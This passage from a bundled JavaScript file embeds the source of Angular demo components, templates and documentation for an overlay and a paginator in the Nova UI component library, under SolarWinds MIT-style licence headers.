ngAfterViewInit(): void {\n        this.overlay.clickOutside\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((_) => this.overlay.hide());\n    }\n\n    public setViewportMargin(margin: number): void {\n        this.viewportMargin = margin;\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n}\n'},55123:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    #toggleButton\n    class="mr-3"\n    type="button"\n    [isEmpty]="false"\n    (click)="overlay.toggle()"\n    i18n\n>\n    Toggle the Overlay\n</button>\n\n<button\n    nui-button\n    type="button"\n    [isEmpty]="false"\n    (click)="setViewportMargin(30)"\n    i18n\n>\n    Viewport margin 30px\n</button>\n\n<button\n    nui-button\n    type="button"\n    [isEmpty]="false"\n    (click)="setViewportMargin(100)"\n    i18n\n>\n    Viewport margin 100px\n</button>\n\n<nui-overlay\n    #overlay\n    [toggleReference]="toggleButton[\'el\'].nativeElement"\n    [viewportMargin]="viewportMargin"\n    [overlayConfig]="overlayConfig"\n>\n    <nui-menu-item *ngFor="let item of items">{{ item }}</nui-menu-item>\n</nui-overlay>\n'},8455:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { DragDropModule } from "@angular/cdk/drag-drop";\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiCommonModule,\n    NuiDialogModule,\n    NuiDocsModule,\n    NuiExpanderModule,\n    NuiIconModule,\n    NuiMenuModule,\n    NuiMessageModule,\n    NuiOverlayAdditionsModule,\n    NuiOverlayModule,\n    NuiSearchModule,\n    NuiSelectV2Module,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    CustomConfirmationInsideDialogComponent,\n    OverlayArrowExampleComponent,\n    OverlayCustomContainerExampleComponent,\n    OverlayCustomDialogComponent,\n    OverlayCustomStylesExampleComponent,\n    OverlayDocsComponent,\n    OverlayPopupStylesExampleComponent,\n    OverlayShowHideToggleExampleComponent,\n    OverlaySimpleExampleComponent,\n    OverlayTestComponent,\n    OverlayViewportMarginExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: OverlayDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "basic",\n        component: OverlaySimpleExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "with-popup-styles",\n        component: OverlayPopupStylesExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "custom-styles",\n        component: OverlayCustomStylesExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "arrow",\n        component: OverlayArrowExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "custom-container",\n        component: OverlayCustomContainerExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "toggle-examples",\n        component: OverlayShowHideToggleExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "viewport-margin",\n        component: OverlayViewportMarginExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "custom-dialog",\n        component: OverlayCustomDialogComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "custom-confirmation-dialog",\n        component: CustomConfirmationInsideDialogComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "overlay-test",\n        component: OverlayTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiCommonModule,\n        NuiSelectV2Module,\n        NuiOverlayModule,\n        NuiOverlayAdditionsModule,\n        NuiMessageModule,\n        NuiButtonModule,\n        NuiExpanderModule,\n        NuiDialogModule,\n        NuiIconModule,\n        ReactiveFormsModule,\n        FormsModule,\n        NuiCheckboxModule,\n        NuiSearchModule,\n        NuiDocsModule,\n        NuiMenuModule,\n        DragDropModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        OverlaySimpleExampleComponent,\n        OverlayShowHideToggleExampleComponent,\n        OverlayTestComponent,\n        OverlayCustomStylesExampleComponent,\n        OverlayCustomContainerExampleComponent,\n        OverlayDocsComponent,\n        OverlayViewportMarginExampleComponent,\n        OverlayArrowExampleComponent,\n        OverlayPopupStylesExampleComponent,\n        OverlayCustomDialogComponent,\n        CustomConfirmationInsideDialogComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("overlay"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class OverlayModule {}\n'},52158:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./paginator-docs/paginator-docs.example.component";\nexport * from "./paginator-adjacent/paginator-adjacent.example.component";\nexport * from "./paginator-basic/paginator-basic.example.component";\nexport * from "./paginator-custom-page-set/paginator-custom-page-set.example.component";\nexport * from "./paginator-hidden-prev-next/paginator-hidden-prev-next.example.component";\nexport * from "./paginator-styling/paginator-styling.example.component";\nexport * from "./paginator-virtual-scroll/paginator-virtual-scroll.example.component";\nexport * from "./paginator-visibility/paginator-visibility.example.component";\nexport * from "./paginator-visual-test/paginator-visual-test.component";\nexport * from "./paginator-test/paginator-test.component";\n'},76458:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-paginator\n    id="nui-demo-adjacent-paginator"\n    [page]="10"\n    [pageSize]="25"\n    [total]="1012"\n    [adjacent]="2"\n>\n</nui-paginator>\n'},84150:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-adjacent-example",\n    templateUrl: "./paginator-adjacent.example.component.html",\n})\nexport class PaginatorAdjacentExampleComponent {}\n'},97792:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-paginator\n    id="nui-demo-basic-paginator"\n    [page]="1"\n    [pageSize]="25"\n    [total]="1012"\n>\n</nui-paginator>\n'},78816:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-basic-example",\n    templateUrl: "./paginator-basic.example.component.html",\n})\nexport class PaginatorBasicExampleComponent {}\n'},59660:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-paginator\n    id="nui-demo-custom-page-size-set-paginator"\n    [page]="10"\n    [pageSize]="15"\n    [total]="2080"\n    [pageSizeSet]="customPageSizeSet"\n>\n</nui-paginator>\n'},83388:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-custom-page-set-example",\n    templateUrl: "./paginator-custom-page-set.example.component.html",\n})\nexport class PaginatorCustomPageSetExampleComponent {\n    public customPageSizeSet = [5, 15, 30, 150, 200];\n}\n'},73280:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiPaginatorModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To get a basic paginator working, only 2 parameters are required:\n    <code>total</code> item count and <code>pageSize</code> - which is the item\n    count per page. Use the <code>page</code> parameter to optionally set the\n    current page-link (default=1).\n</p>\n<nui-message [allowDismiss]="false" type="warning">\n    <b>Important:</b> <code>pageSize</code> is a Number, so\n    <code>pageSize="42"</code> won\'t work. PageSize can take only those values\n    that are listed in defaultPageSizeSet (10, 25, 50, 100).\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="paginator-basic"\n    exampleTitle="Simple Paginator"\n>\n    <nui-paginator-basic-example></nui-paginator-basic-example>\n</nui-example-wrapper>\n\n<h2>Adjacent Page-Links</h2>\n\n<p>\n    Control the number of page-links shown <i>adjacent</i> to the current\n    page-link with the <code>adjacent</code> parameter. When the current\n    page-link is flanked by ellipses, <code>adjacent</code> page-links are\n    displayed on both sides of the current page-link. Up tp\n    <code>adjacent * 2 + 1 + 6</code> total links are displayed. Default\n    <code>adjacent</code> = 1. By default, the maximum number of links shown is\n    <code>adjacent*2+5</code>, but the default can be overriden using the\n    <code>maxElements</code> parameter.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="paginator-adjacent"\n    exampleTitle="Adjacent Example"\n>\n    <nui-paginator-adjacent-example></nui-paginator-adjacent-example>\n</nui-example-wrapper>\n\n<h2>Custom Page Size Set</h2>\n\n<p>\n    You can define avaliable item counts per page. To do this you need to define\n    <code>pageSizeSet</code> input which has\n    <code>Array&lt;number&gt;</code> type. By default this input has 10, 25, 50,\n    100 page sizes.\n</p>\n<nui-message [allowDismiss]="false" type="warning">\n    <b>Important:</b> <code>pageSize</code> can take only those values that are\n    listed in pageSizeSet.\n</nui-message>\n\n<nui-example-wrapper\n    filenamePrefix="paginator-custom-page-set"\n    exampleTitle="Custom Page Size Set"\n>\n    <nui-paginator-custom-page-set-example></nui-paginator-custom-page-set-example>\n</nui-example-wrapper>\n\n<h2>Previous and Next Buttons</h2>\n\n<p>\n    Prev and Next buttons can be hidden if you pass <code>showPrevNext</code> as\n    false.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="paginator-hidden-prev-next"\n    exampleTitle="Hidden Prev-Next Example"\n>\n    <nui-paginator-hidden-prev-next-example></nui-paginator-hidden-prev-next-example>\n</nui-example-wrapper>\n\n<h2>Styling</h2>\n\n<p>\n    There are a couple of ways to customize the paginator styles. Use\n    <code>activeClass</code> to customize the active page-link and\n    <code>disabledClass</code> to customize the disabled paginator. It\'s also\n    possible to override the ellipses characters using the\n    <code>dots</code> parameter.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="paginator-styling"\n    exampleTitle="Styling Example"\n>\n    <nui-paginator-styling-example></nui-paginator-styling-example>\n</nui-example-wrapper>\n\n<h2>Performance Improvements</h2>\n\n<p>\n    Virtual scroll is used in the "three dots" popup, when the number of hidden\n    pages is greater than 1000.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="paginator-virtual-scroll"\n    exampleTitle="Virtual Scroll Example"\n>\n    <nui-paginator-virtual-scroll-example></nui-paginator-virtual-scroll-example>\n</nui-example-wrapper>\n\n<h2>Visibility</h2>\n\n<p>\n    Paginator visibility is affected by several different factors.\n    <code>hide</code> allows the developer to explictly control paginator\n    visibility, while <code>hideIfEmpty</code> allows the developer to\n    optionally hide the paginator when the dataset is empty (default=false).\n    Finally, the paginator is hidden automatically if <code>total</code>\n    is less than 10 or if invalid parameters are specified.\n</p>\n'},90592:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-docs-example",\n    templateUrl: "./paginator-docs.example.component.html",\n})\nexport class PaginatorExampleComponent {}\n'},10590:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-paginator\n    id="nui-demo-hide-prev-next"\n    [page]="1"\n    [pageSize]="10"\n    [total]="18"\n    [adjacent]="1"\n    [showPrevNext]="false"\n>\n</nui-paginator>\n'},32570:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-hidden-prev-next-example",\n    templateUrl: "./paginator-hidden-prev-next.example.component.html",\n})\nexport class PaginatorHiddenPrevNextExampleComponent {}\n'},36980:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-paginator\n    id="nui-demo-paginator-styling"\n    [page]="10"\n    [pageSize]="25"\n    [total]="1012"\n    activeClass="nui-message-error"\n    dots="\xb0\xb0\xb0"\n>\n</nui-paginator>\n'},41844:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-styling-example",\n    templateUrl: "./paginator-styling.example.component.html",\n})\nexport class PaginatorStylingExampleComponent {}\n'},49470:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <nui-paginator-basic-example></nui-paginator-basic-example>\n\n    <nui-paginator-adjacent-example></nui-paginator-adjacent-example>\n</div>\n'},73114:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-test",\n    templateUrl: "./paginator-test.component.html",\n})\nexport class PaginatorTestComponent {}\n'},42304:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-paginator\n    id="nui-demo-custom-page-size-set-paginator"\n    [page]="10"\n    [pageSize]="1"\n    [total]="100000"\n    [pageSizeSet]="customPageSizeSet"\n>\n</nui-paginator>\n'},42752:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-virtual-scroll-example",\n    templateUrl: "./paginator-virtual-scroll.example.component.html",\n})\nexport class PaginatorVirtualScrollExampleComponent {\n    public customPageSizeSet = [1, 30, 200];\n}\n'},8270:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-paginator\n    id="nui-demo-visibility-paginator"\n    [page]="10"\n    [pageSize]="25"\n    [total]="1012"\n    [adjacent]="1"\n    [hide]="false"\n    [hideIfEmpty]="true"\n>\n</nui-paginator>\n'},66666:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-visibility-example",\n    templateUrl: "./paginator-visibility.example.component.html",\n})\nexport class PaginatorVisibilityExampleComponent {}\n'},39400:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>Basic Paginator</h3>\n    <nui-paginator\n        id="nui-visual-test-basic-paginator"\n        [page]="1"\n        [pageSize]="10"\n        [total]="1012"\n    >\n    </nui-paginator>\n\n    <h3>Paginator Adjacent Page-Links</h3>\n    <nui-paginator\n        id="nui-visual-test-adjacent-paginator"\n        [page]="41"\n        [pageSize]="25"\n        [total]="1012"\n        [adjacent]="2"\n    >\n    </nui-paginator>\n\n    <h3>\n        Paginator With Custom Page Set and Without Previous and Next Buttons\n    </h3>\n    <nui-paginator\n        id="nui-visual-test-custom-page-set-paginator"\n        [page]="5"\n        [pageSize]="2"\n        [total]="18"\n        [adjacent]="1"\n        [pageSizeSet]="customPageSizeSet"\n        [showPrevNext]="false"\n    >\n    </nui-paginator>\n\n    <h3>Paginator With Custom Styling</h3>\n    <nui-paginator\n        id="nui-visual-test-paginator-styling"\n        [page]="10"\n        [pageSize]="25"\n        [total]="1012"\n        activeClass="nui-message-error"\n        dots="\xb0\xb0\xb0"\n    >\n    </nui-paginator>\n\n    <h3>Invisible Paginator</h3>\n    <nui-paginator\n        id="nui-visual-test-visibility-paginator"\n        [page]="0"\n        [pageSize]="0"\n        [total]="0"\n        [adjacent]="1"\n        [hideIfEmpty]="true"\n    >\n    </nui-paginator>\n\n    <h3>Paginator with Virtual Scroll</h3>\n    <nui-paginator-virtual-scroll-example></nui-paginator-virtual-scroll-example>\n</div>\n'},8536:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-paginator-visual-test",\n    templateUrl: "./paginator-visual-test.component.html",\n})\nexport class PaginatorVisualTestComponent {\n    public customPageSizeSet = [2, 10, 25, 50, 100];\n}\n'},50691:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights 